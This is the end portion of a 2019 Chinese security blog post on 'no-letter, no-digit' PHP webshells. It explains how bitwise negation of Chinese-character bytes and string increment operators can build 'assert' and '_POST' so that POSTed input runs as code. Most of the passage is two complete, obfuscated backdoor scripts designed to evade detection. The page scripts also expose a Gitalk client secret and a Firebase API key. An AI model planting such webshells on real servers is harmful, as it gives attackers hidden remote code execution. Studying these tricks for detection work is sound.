+<h3 id="位运算里的“取反”"><a href="#位运算里的“取反”" class="headerlink" title="位运算里的“取反”"></a>位运算里的“取反”</h3><p>方法二利用的是UTF-8编码的某个汉字，并将其中某个字符取出来，比如’和’{2}的结果是”\x8c”，其取反即为字母s：<br><img src="Webshell%E4%B8%80%E6%8A%8A%E6%A2%AD/1.png" alt="Alt text"></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$__=(<span class="string">'&gt;'</span>&gt;<span class="string">'&lt;'</span>)+(<span class="string">'&gt;'</span>&gt;<span class="string">'&lt;'</span>);</span><br><span class="line">$_=$__/$__;</span><br><span class="line"></span><br><span class="line">$____=<span class="string">''</span>;</span><br><span class="line">$___=<span class="string">"瞰"</span>;$____.=~($___&#123;$_&#125;);$___=<span class="string">"和"</span>;$____.=~($___&#123;$__&#125;);$___=<span class="string">"和"</span>;$____.=~($___&#123;$__&#125;);$___=<span class="string">"的"</span>;$____.=~($___&#123;$_&#125;);$___=<span class="string">"半"</span>;$____.=~($___&#123;$_&#125;);$___=<span class="string">"始"</span>;$____.=~($___&#123;$__&#125;);</span><br><span class="line"></span><br><span class="line">$_____=<span class="string">'_'</span>;$___=<span class="string">"俯"</span>;$_____.=~($___&#123;$__&#125;);$___=<span class="string">"瞰"</span>;$_____.=~($___&#123;$__&#125;);$___=<span class="string">"次"</span>;$_____.=~($___&#123;$_&#125;);$___=<span class="string">"站"</span>;$_____.=~($___&#123;$_&#125;);</span><br><span class="line"></span><br><span class="line">$_=$$_____;</span><br><span class="line">$____($_[$__]);</span><br></pre></td></tr></table></figure>
+
+<p>这个答案还利用了PHP的弱类型特性。因为要获取’和’{2}，就必须有数字2。而PHP由于弱类型这个特性，true的值为1，故true+true==2，也就是(‘&gt;’&gt;’&lt;’)+(‘&gt;’&gt;’&lt;’)==2。</p>
+<h3 id="递增／递减运算符"><a href="#递增／递减运算符" class="headerlink" title="递增／递减运算符"></a>递增／递减运算符</h3><p><img src="Webshell%E4%B8%80%E6%8A%8A%E6%A2%AD/2.png" alt="Alt text"></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$_=[];</span><br><span class="line">$_=@<span class="string">"$_"</span>; <span class="comment">// $_='Array';</span></span><br><span class="line">$_=$_[<span class="string">'!'</span>==<span class="string">'@'</span>]; <span class="comment">// $_=$_[0];</span></span><br><span class="line">$___=$_; <span class="comment">// A</span></span><br><span class="line">$__=$_;</span><br><span class="line">$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;</span><br><span class="line">$___.=$__; <span class="comment">// S</span></span><br><span class="line">$___.=$__; <span class="comment">// S</span></span><br><span class="line">$__=$_;</span><br><span class="line">$__++;$__++;$__++;$__++; <span class="comment">// E </span></span><br><span class="line">$___.=$__;</span><br><span class="line">$__=$_;</span><br><span class="line">$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; <span class="comment">// R</span></span><br><span class="line">$___.=$__;</span><br><span class="line">$__=$_;</span><br><span class="line">$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; <span class="comment">// T</span></span><br><span class="line">$___.=$__;</span><br><span class="line"></span><br><span class="line">$____=<span class="string">'_'</span>;</span><br><span class="line">$__=$_;</span><br><span class="line">$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; <span class="comment">// P</span></span><br><span class="line">$____.=$__;</span><br><span class="line">$__=$_;</span><br><span class="line">$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; <span class="comment">// O</span></span><br><span class="line">$____.=$__;</span><br><span class="line">$__=$_;</span><br><span class="line">$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; <span class="comment">// S</span></span><br><span class="line">$____.=$__;</span><br><span class="line">$__=$_;</span><br><span class="line">$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; <span class="comment">// T</span></span><br><span class="line">$____.=$__;</span><br><span class="line"></span><br><span class="line">$_=$$____;</span><br><span class="line">$___($_[_]); <span class="comment">// ASSERT($_POST[_]);</span></span><br></pre></td></tr></table></figure>
+
+
+      
+    </div>
+
+    
+
+    
+    
+    
+
+    
+
+    
+      
+    
+    
+
+    
+      <div>
+        
+
+
+
+
+  
+
+
+
+<ul class="post-copyright">
+  <li class="post-copyright-author">
+    <strong>本文作者： </strong>P2hm1n</li>
+  <li class="post-copyright-link">
+    <strong>本文链接：</strong>
+    
+    <a href="https://p2hm1n.github.io/2019/06/09/Webshell一把梭/" title="Webshell一把梭">https://p2hm1n.github.io/2019/06/09/Webshell一把梭/</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" rel="noopener" target="_blank"><i class="fa fa-fw fa-creative-commons"></i>BY-NC-SA</a> 许可协议。转载请注明出处！</li>
+</ul>
+
+      </div>
+    
+
+    <footer class="post-footer">
+      
+        
+          
+        
+        <div class="post-tags">
+          
+            <a href="/tags/Other/" rel="tag"># Other</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2019/06/09/工具一把梭/" rel="next" title="工具一把梭">
+                <i class="fa fa-chevron-left"></i> 工具一把梭
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+  </div>
+
+
+          </div>
+          
+
+  
+    <div class="comments" id="gitalk-container">
+    </div>
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image" src="/images/lufei.jpg" alt="P2hm1n">
+            
+              <p class="site-author-name" itemprop="name">P2hm1n</p>
+              <div class="site-description motion-element" itemprop="description">ONE PIECE</div>
+          </div>
+
+          
+            <nav class="site-state motion-element">
+              
+                <div class="site-state-item site-state-posts">
+                
+                  <a href="/archives/">
+                
+                    <span class="site-state-item-count">8</span>
+                    <span class="site-state-item-name">日志</span>
+                  </a>
+                </div>
+              
+
+              
+                
+                
+                <div class="site-state-item site-state-categories">
+                  
+                    
+                      <a href="/categories/">
+                    
+                  
+                    
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                    <span class="site-state-item-count">3</span>
+                    <span class="site-state-item-name">分类</span>
+                  </a>
+                </div>
+              
+
+              
+                
+                
+                <div class="site-state-item site-state-tags">
+                  
+                    
+                      <a href="/tags/">
+                    
+                  
+                    
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                    <span class="site-state-item-count">4</span>
+                    <span class="site-state-item-name">标签</span>
+                  </a>
+                </div>
+              
+            </nav>
+          
+
+          
+
+          
+
+          
+            <div class="links-of-author motion-element">
+              
+                <span class="links-of-author-item">
+                  
+                  
+                    
+                  
+                  
+                    
+                  
+                  <a href="https://github.com/P2hm1n" title="GitHub &rarr; https://github.com/P2hm1n" rel="noopener" target="_blank"><i class="fa fa-fw fa-github"></i>GitHub</a>
+                </span>
+              
+                <span class="links-of-author-item">
+                  
+                  
+                    
+                  
+                  
+                    
+                  
+                  <a href="/qq7832919@gmail.com" title="E-Mail &rarr; qq7832919@gmail.com"><i class="fa fa-fw fa-envelope"></i>E-Mail</a>
+                </span>
+              
+                <span class="links-of-author-item">
+                  
+                  
+                    
+                  
+                  
+                    
+                  
+                  <a href="https://twitter.com/p2hm1n" title="Twitter &rarr; https://twitter.com/p2hm1n" rel="noopener" target="_blank"><i class="fa fa-fw fa-twitter"></i>Twitter</a>
+                </span>
+              
+            </div>
+          
+
+          
+
+          
+          
+
+          
+            
+          
+          
+
+        </div>
+      </div>
+
+      
+      <!--noindex-->
+        <div class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+            
+            
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#各类免杀webshell"><span class="nav-number">1.</span> <span class="nav-text">各类免杀webshell</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#PHP"><span class="nav-number">1.1.</span> <span class="nav-text">PHP</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#phithon圈子里面的"><span class="nav-number">1.1.1.</span> <span class="nav-text">phithon圈子里面的</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#无字母数字webshell"><span class="nav-number">2.</span> <span class="nav-text">无字母数字webshell</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#一些不包含数字和字母的webshell"><span class="nav-number">2.1.</span> <span class="nav-text">一些不包含数字和字母的webshell</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#位运算里的“异或”"><span class="nav-number">2.1.1.</span> <span class="nav-text">位运算里的“异或”</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#位运算里的“取反”"><span class="nav-number">2.1.2.</span> <span class="nav-text">位运算里的“取反”</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#递增／递减运算符"><span class="nav-number">2.1.3.</span> <span class="nav-text">递增／递减运算符</span></a></li></ol></li></ol></li></ol></div>
+            
+
+          </div>
+        </div>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+  
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2019</span>
+  <span class="with-love" id="animate">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">P2hm1n</span>
+
+  
+
+  
+</div>
+
+
+
+
+
+
+
+
+        
+
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+    
+
+    
+  </div>
+
+  
+
+<script>
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+    
+    
+  
+  <script color="0,0,255" opacity="0.5" zindex="-1" count="99" src="/lib/canvas-nest/canvas-nest.min.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  <script src="/lib/jquery/index.js?v=2.1.3"></script>
+
+  
+  <script src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+
+  
+  <script src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+
+
+  
+
+
+  <script src="/js/utils.js?v=7.1.2"></script>
+
+  <script src="/js/motion.js?v=7.1.2"></script>
+
+
+
+  
+  
+
+
+  <script src="/js/schemes/muse.js?v=7.1.2"></script>
+
+
+
+  
+  <script src="/js/scrollspy.js?v=7.1.2"></script>
+<script src="/js/post-details.js?v=7.1.2"></script>
+
+
+
+  
+
+
+  <script src="/js/next-boot.js?v=7.1.2"></script>
+
+
+  
+
+  
+
+  
+
+  
+
+
+  
+    
+
+<script src="//cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.min.js"></script>
+
+
+
+<link rel="stylesheet" href="//cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.min.css">
+
+
+
+<script src="//cdn.jsdelivr.net/npm/js-md5@0.7.3/src/md5.min.js"></script>
+
+<script>
+  var gitalk = new Gitalk({
+    clientID: '355064866eb0a9c2de67',
+    clientSecret: '2e624255d41f832c93f2b3d8d828ecb1020eac9c',
+    repo: 'Gitalk',
+    owner: 'P2hm1n',
+    admin: [''],
+    id: md5(location.pathname),
+    
+      language: window.navigator.language || window.navigator.userLanguage,
+    
+    distractionFreeMode: 'true'
+  });
+  gitalk.render('gitalk-container');
+</script>
+
+  
+
+
+  
+
+
+
+
+  
+
+  
+  <script src="https://www.gstatic.com/firebasejs/4.6.0/firebase.js"></script>
+  <script src="https://www.gstatic.com/firebasejs/4.6.0/firebase-firestore.js"></script>
+  
+  <script>
+    (function () {
+
+      firebase.initializeApp({
+        apiKey: 'AIzaSyCDQ4n4iCo1yBkV-vwZmbaCxR8JgT7zTi4',
+        projectId: 'blog-6ef40'
+      })
+
+      function getCount(doc, increaseCount) {
+        //increaseCount will be false when not in article page
+
+        return doc.get().then(function (d) {
+          var count
+          if (!d.exists) { //has no data, initialize count
+            if (increaseCount) {
+              doc.set({
+                count: 1
+              })
+              count = 1
+            }
+            else {
+              count = 0
+            }
+          }
+          else { //has data
+            count = d.data().count
+            if (increaseCount) {
+              if (!(window.localStorage && window.localStorage.getItem(title))) { //if first view this article
+                doc.set({ //increase count
+                  count: count + 1
+                })
+                count++
+              }
+            }
+          }
+          if (window.localStorage && increaseCount) { //mark as visited
+            localStorage.setItem(title, true)
+          }
+
+          return count
+        })
+      }
+
+      function appendCountTo(el) {
+        return function (count) {
+          $(el).append(
+            $('<span>').addClass('post-visitors-count').append(
+              $('<span>').addClass('post-meta-divider').text('|')
+            ).append(
+              $('<span>').addClass('post-meta-item-icon').append(
+                $('<i>').addClass('fa fa-users')
+              )
+              ).append($('<span>').text('阅读次数 ' + count))
+          )
+        }
+      }
+
+      var db = firebase.firestore()
+      var articles = db.collection('articles')
+
+      //https://hexo.io/docs/variables.html
+      var isPost = 'Webshell一把梭'.length > 0
+      var isArchive = '' === 'true'
+      var isCategory = ''.length > 0
+      var isTag = ''.length > 0
+
+      if (isPost) { //is article page
+        var title = 'Webshell一把梭'
+        var doc = articles.doc(title)
+
+        getCount(doc, true).then(appendCountTo($('.post-meta')))
+      }
+      else if (!isArchive && !isCategory && !isTag) { //is index page
+        var titles = [] //array to titles
+
+        var postsstr = '' //if you have a better way to get titles of posts, please change it
+        eval(postsstr)
+
+        var promises = titles.map(function (title) {
+          return articles.doc(title)
+        }).map(function (doc) {
+          return getCount(doc)
+        })
+        Promise.all(promises).then(function (counts) {
+          var metas = $('.post-meta')
+          counts.forEach(function (val, idx) {
+            appendCountTo(metas[idx])(val)
+          })
+        })
+      }
+    })()
+  </script>
+
+
+  
+
+  
+
+  
+
+  
+  <script>
+    (function(){
+      var bp = document.createElement('script');
+      var curProtocol = window.location.protocol.split(':')[0];
+      bp.src = (curProtocol === 'https') ? 'https://zz.bdstatic.com/linksubmit/push.js' : 'http://push.zhanzhang.baidu.com/push.js';
+      var s = document.getElementsByTagName("script")[0];
+      s.parentNode.insertBefore(bp, s);
+    })();
+  </script>
+
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  <script src="/js/wobblewindow.js"></script>
+  <script>
+    //只在桌面版网页启用特效
+    if( window.innerWidth > 768  ){
+      $(document).ready(function () {
+        
+          $('#header').wobbleWindow({
+            radius: 50,
+            movementTop: false,
+            movementLeft: false,
+            movementRight: false,
+            debug: false,
+          });
+        
+
+        
+          $('#sidebar').wobbleWindow({
+            radius: 50,
+            movementLeft: false,
+            movementTop: false,
+            movementBottom: false,
+            position: 'fixed',
+            debug: false,
+          });
+        
+
+        
+          $('#footer').wobbleWindow({
+            radius: 50,
+            movementBottom: false,
+            movementLeft: false,
+            movementRight: false,
+            offsetX: ,
+            position: 'absolute',
+            debug: false,
+          });
+        
+      });
+    }
+  </script>
+
+
+
+
+  <script src="/js/activate-power-mode.min.js"></script>
+  <script>
+    POWERMODE.colorful = true;
+    POWERMODE.shake = false;
+    document.body.addEventListener('input', POWERMODE);
+  </script>
+
+  <script type="text/javascript" src="/js/love.js"></script>
+<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"log":false,"pluginJsPath":"lib/","pluginModelPath":"assets/","pluginRootPath":"live2dw/","tagMode":false});</script></body>
+</html>
